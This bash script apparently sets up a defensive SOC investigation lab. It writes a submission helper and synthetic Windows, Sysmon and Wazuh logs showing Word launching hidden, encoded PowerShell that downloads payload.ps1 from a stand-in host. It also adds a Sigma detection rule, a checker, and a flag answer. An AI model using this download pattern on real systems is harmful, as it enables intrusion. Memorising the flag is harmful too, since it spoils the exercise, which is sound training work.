#!/bin/bash
set -euo pipefail
export DEBIAN_FRONTEND=noninteractive
LAB_ROOT="/opt/interactive-lab"
CASE_ROOT="/root/investigation"
mkdir -p "$LAB_ROOT" "$CASE_ROOT/logs" "$CASE_ROOT/rules" /root/answers
rm -f "$LAB_ROOT/.ready"
apt-get update -qq
apt-get install -y -qq jq coreutils grep sed gawk bsdextrautils >/var/log/interactive-lab-packages.log 2>&1

cat > /usr/local/bin/lab-submit <<'EOF'
#!/bin/bash
set -euo pipefail
if [ "$#" -lt 2 ]; then
  echo "Usage: lab-submit <process|parent|encoded|user|ip|mitre|sigma-count|flag> <answer>"
  exit 1
fi
key="$1"
shift
case "$key" in
  process|parent|encoded|user|ip|mitre|sigma-count|flag) ;;
  *) echo "Unknown task key: $key"; exit 1 ;;
esac
mkdir -p /root/answers
printf '%s\n' "$*" > "/root/answers/$key"
echo "Answer saved for: $key"
EOF
chmod +x /usr/local/bin/lab-submit

cat > "$CASE_ROOT/case-summary.txt" <<'EOF'
CASE ID: SOC-2026-014
HOST: FIN-WS-07
ALERT: Office application launched suspicious PowerShell
WINDOW: 2026-07-18 09:41:00Z - 09:44:00Z
EOF

cat > "$CASE_ROOT/logs/sysmon.jsonl" <<'EOF'
{"UtcTime":"2026-07-18 09:40:58.144","EventID":1,"Computer":"FIN-WS-07","User":"NORTHSTAR\\jsingh","Image":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","CommandLine":"WINWORD.EXE C:\\Users\\jsingh\\Downloads\\Quarterly_Review.docm","ParentImage":"C:\\Windows\\explorer.exe","ProcessId":4120,"ParentProcessId":3012}
{"UtcTime":"2026-07-18 09:42:11.903","EventID":1,"Computer":"FIN-WS-07","User":"NORTHSTAR\\jsingh","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHQAcgBhAGkAbgBpAG4AZwAnADsAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIABoAHQAdABwADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBwAGEAeQBsAG8AYQBkAC4AcABzADEA","ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","ProcessId":5296,"ParentProcessId":4120}
{"UtcTime":"2026-07-18 09:42:13.227","EventID":3,"Computer":"FIN-WS-07","User":"NORTHSTAR\\jsingh","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ProcessId":5296,"Protocol":"tcp","DestinationIp":"198.51.100.42","DestinationPort":80,"DestinationHostname":"cdn-update.training.local","Initiated":true}
EOF

cat > "$CASE_ROOT/logs/windows-security.jsonl" <<'EOF'
{"TimeCreated":"2026-07-18T09:40:58.148Z","EventID":4688,"Computer":"FIN-WS-07","SubjectUserName":"jsingh","SubjectDomainName":"NORTHSTAR","NewProcessName":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","ParentProcessName":"C:\\Windows\\explorer.exe","CommandLine":"WINWORD.EXE C:\\Users\\jsingh\\Downloads\\Quarterly_Review.docm"}
{"TimeCreated":"2026-07-18T09:42:11.909Z","EventID":4688,"Computer":"FIN-WS-07","SubjectUserName":"jsingh","SubjectDomainName":"NORTHSTAR","NewProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentProcessName":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","CommandLine":"powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHQAcgBhAGkAbgBpAG4AZwAnADsAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIABoAHQAdABwADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBwAGEAeQBsAG8AYQBkAC4AcABzADEA"}
EOF

cat > "$CASE_ROOT/logs/powershell-4104.log" <<'EOF'
TimeCreated=2026-07-18T09:42:12.104Z
EventID=4104
Computer=FIN-WS-07
User=NORTHSTAR\jsingh
ScriptBlockText=Write-Output 'training'; Invoke-WebRequest http://198.51.100.42/payload.ps1
EOF

cat > "$CASE_ROOT/logs/wazuh-alerts.jsonl" <<'EOF'
{"timestamp":"2026-07-18T09:42:12.500Z","rule":{"id":"92045","level":12,"description":"Office application spawned PowerShell with encoded command","groups":["windows","sysmon","powershell"],"mitre":{"id":["T1059.001","T1204.002"],"tactic":["Execution","Initial Access"],"technique":["PowerShell","Malicious File"]}},"agent":{"id":"007","name":"FIN-WS-07"},"data":{"win":{"eventdata":{"image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","parentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","user":"NORTHSTAR\\jsingh","destinationIp":"198.51.100.42"}}},"incident_flag":"SWM{powershell_chain_detected}"}
EOF

cat > "$CASE_ROOT/logs/network-connections.csv" <<'EOF'
timestamp,host,user,process,pid,destination_ip,destination_port,protocol
2026-07-18T09:42:13.227Z,FIN-WS-07,NORTHSTAR\\jsingh,powershell.exe,5296,198.51.100.42,80,tcp
EOF

cat > "$CASE_ROOT/rules/powershell-encoded.yml" <<'EOF'
title: Suspicious PowerShell Encoded Command
status: experimental
description: Detects PowerShell launched with an encoded command by an Office parent process.
logsource:
  category: process_creation
  product: windows
detection:
  selection_image:
    Image|endswith: '\powershell.exe'
  selection_command:
    CommandLine|contains:
      - '-EncodedCommand'
      - '-enc'
  selection_parent:
    ParentImage|endswith:
      - '\WINWORD.EXE'
      - '\EXCEL.EXE'
      - '\POWERPNT.EXE'
  condition: all of selection_*
level: high
tags:
  - attack.execution
  - attack.t1059.001
EOF

cat > /usr/local/bin/sigma-check <<'EOF'
#!/bin/bash
set -euo pipefail
logs="/root/investigation/logs/sysmon.jsonl"
count="$(jq -r 'select(.EventID == 1 and (.Image | ascii_downcase | endswith("\\powershell.exe")) and (.CommandLine | ascii_downcase | contains("-encodedcommand")) and (.ParentImage | ascii_downcase | endswith("\\winword.exe"))) | .ProcessId' "$logs" | wc -l | xargs)"
echo "Rule: Suspicious PowerShell Encoded Command"
echo "Matches: $count"
echo "Technique: T1059.001"
EOF
chmod +x /usr/local/bin/sigma-check

touch "$LAB_ROOT/.ready"
